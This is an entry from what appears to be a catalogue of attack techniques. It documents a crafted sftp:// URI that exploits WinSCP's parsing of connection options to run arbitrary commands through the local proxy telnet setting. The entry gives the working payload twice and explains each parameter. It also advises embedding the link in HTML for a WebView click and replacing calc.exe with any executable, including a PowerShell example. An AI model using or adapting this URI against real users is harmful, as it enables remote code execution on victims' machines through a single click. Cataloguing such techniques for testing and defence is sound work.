---
id: cmd-1
data: >-
  sftp://youtube:com;watch=sn96aVA2;x-proxymethod=5;x-proxytelnetcommand=calc.exe@foo.bar/
tags:
  - rce
  - sftp
  - winscp
type: command
output: Execution of calc.exe on Windows
executor: uri
platforms:
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.885Z'
verified: false
validated: true
submitted: true
---
# sftp-uri-winscp-rce

## Command

This is a URI scheme invoked via link click, not a shell command.

```uri
sftp://youtube:com;watch=sn96aVA2;x-proxymethod=5;x-proxytelnetcommand=calc.exe@foo.bar/
```

## Description

Malicious SFTP URI that exploits WinSCP's parsing of advanced connection settings to execute arbitrary commands via the local proxy telnet command before establishing a connection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| x-proxymethod | Sets proxy mode to 5 (Local proxy) | Yes |
| x-proxytelnetcommand | Command to execute (e.g., calc.exe@foo.bar) | Yes |
| username:password | Dummy credentials (youtube:com) | No |

## Examples

### Basic Usage

Embed in HTML link for WebView click.

### Advanced Usage

Substitute calc.exe with any executable: x-proxytelnetcommand=powershell -c 'Get-Process'@foo.bar/

## Expected Output

WinSCP launches briefly, executes the command (e.g., Calculator opens), then fails connection.

## Related

- [[Related Procedure: Exploit-OS-Handler-for-Arbitrary-Code-Execution]]
